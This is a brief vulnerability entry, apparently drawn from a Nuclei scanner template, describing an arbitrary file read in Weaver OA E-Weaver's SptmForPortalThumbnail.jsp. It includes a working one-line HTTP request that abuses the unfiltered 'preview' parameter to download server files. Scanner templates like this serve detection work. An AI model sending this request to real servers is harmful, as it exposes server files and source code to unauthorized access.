# Vulnerability: OA E-Weaver SptmForPortalThumbnail - Arbitrary File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`weaver-sptmforportalthumbnail-lfi.yaml`)

## Description
The controllable preview parameters of SptmForPortalThumbnail.jsp are not filtered and are directly spliced to the web root directory for file downloading.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
```

